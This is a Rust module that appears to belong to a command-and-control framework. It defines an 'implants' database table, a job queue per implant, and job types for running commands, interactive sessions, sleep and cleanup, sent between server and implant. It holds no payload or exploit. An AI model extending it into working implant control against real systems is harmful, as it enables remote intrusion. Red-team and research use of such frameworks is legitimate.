#![feature(lazy_cell)]
use std::{fmt, path::PathBuf, sync::LazyLock};

use directories::ProjectDirs;
use redb::TableDefinition;
use serde::{Deserialize, Serialize};
use chrono::Utc;

pub static DATA_FOLDER: LazyLock<ProjectDirs> =
    LazyLock::new(|| directories::ProjectDirs::from("com", "codedmasonry", "how_far").unwrap());

/// Key: u32 and Value: Byte array (postcard serialized) of ImplantInfo
pub const DB_TABLE: TableDefinition<u32, &[u8]> = TableDefinition::new("implants");
pub static DB_FILE: LazyLock<PathBuf> = LazyLock::new(|| {
    crate::DATA_FOLDER
        .data_local_dir()
        .to_path_buf()
        .join("db.redb")
});

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ImplantJobType {
    Sleep,
    Run,
    Cleanup,
    Interactive,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ImplantInfo {
    pub last_check: Option<chrono::DateTime<Utc>>,
    pub queue: Vec<ImplantJob>,
}

/// Helpful wrapper for providing details only needed by the server
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ImplantJob {
    pub issue_time: chrono::DateTime<Utc>,
    pub job: ImplantJobInner,
}

/// Inner value that is serialized and should be sent over the internet
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ImplantJobInner {
    pub request_type: ImplantJobType,
    pub args: Vec<String>,
}

/// Type for sending array of ImplantJobInner between server and client
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct NetJobList {
    pub jobs: Vec<ImplantJobInner>,
}

impl fmt::Display for ImplantJobType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let str = match self {
            ImplantJobType::Sleep => "sleep",
            ImplantJobType::Run => "run",
            ImplantJobType::Cleanup => "cleanup",
            ImplantJobType::Interactive => "interactive",
        };
        write!(f, "{str}")
    }
}

impl fmt::Display for ImplantJob {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "[{}]: {}", self.issue_time, self.job)
    }
}

impl fmt::Display for ImplantJobInner {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "request: {}, args: {})", self.request_type, self.args.join(" "))
    }
}